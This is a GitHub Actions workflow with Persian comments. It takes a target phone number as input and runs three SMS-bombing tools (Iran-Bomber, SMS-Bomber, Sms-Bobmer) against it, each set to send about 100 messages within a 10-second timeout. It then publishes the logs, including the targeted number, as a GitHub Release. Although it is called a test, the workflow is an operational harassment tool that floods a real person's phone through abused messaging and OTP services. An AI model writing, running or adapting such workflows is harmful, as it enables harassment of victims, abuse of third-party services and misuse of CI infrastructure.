name: 10s Test with Release Logs

on:
  workflow_dispatch:
    inputs:
      phone_number:
        description: 'Target Phone Number (e.g., 09123456789)'
        required: true
        type: string

# دادن دسترسی برای ساخت Release و آپلود فایل در آن
permissions:
  contents: write

jobs:
  run-bombers:
    name: Test ${{ matrix.tool_name }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - tool_name: 'Iran-Bomber'
            dir: 'iran-bomber'
            type: 'go'
          - tool_name: 'SMS-Bomber'
            dir: 'SMS-Bomber'
            type: 'python'
          - tool_name: 'Sms-Bobmer'
            dir: 'Sms-Bobmer'
            type: 'python'

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      # --- اجرای Iran-Bomber (Go) ---
      - name: Run Iran-Bomber (10s timeout)
        if: matrix.type == 'go'
        run: |
          cd ${{ matrix.dir }}
          echo "Starting Iran-Bomber..."
          # هدایت خروجی به فایل لاگ در پوشه اصلی
          timeout 10s go run sms.go -phone "${{ github.event.inputs.phone_number }}" -c 100 > ../iran-bomber.log 2>&1 || true
          echo "--- Log saved ---"

      # --- راه‌اندازی پایتون ---
      - name: Setup Python
        if: matrix.type == 'python'
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      # --- اجرای SMS-Bomber ---
      - name: Run SMS-Bomber (10s timeout)
        if: matrix.dir == 'SMS-Bomber'
        run: |
          cd ${{ matrix.dir }}
          # اصلاح مسیر requirements.txt
          pip install -r sms_bomber/requirements.txt || pip install aiohttp rich customtkinter
          echo "Starting SMS-Bomber..."
          timeout 10s python run.py "${{ github.event.inputs.phone_number }}" -c 100 -t 5 -v > ../sms-bomber.log 2>&1 || true

      # --- اجرای Sms-Bobmer ---
      - name: Run Sms-Bobmer (10s timeout)
        if: matrix.dir == 'Sms-Bobmer'
        run: |
          cd ${{ matrix.dir }}
          pip install -r requirements.txt
          echo "Starting Sms-Bobmer..."
          timeout 10s bash -c 'echo "${{ github.event.inputs.phone_number }}" | python bomber.py' > ../sms-bobmer.log 2>&1 || true

      # --- آپلود لاگ‌ها در بخش Releases ---
      - name: Upload Logs to GitHub Releases
        uses: softprops/action-gh-release@v2
        if: always() # حتی اگر ابزار با تایم‌اوت متوقف شد، لاگ آپلود شود
        with:
          # ساخت یک تگ منحصر به فرد برای هر بار اجرا
          tag_name: test-run-${{ github.run_number }}
          name: "تست اجرای بمبر - ران ${{ github.run_number }}"
          body: "لاگ‌های تست ۱۰ ثانیه‌ای برای شماره ${{ github.event.inputs.phone_number }}"
          # آپلود تمام فایل‌های log تولید شده
          files: "*.log"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
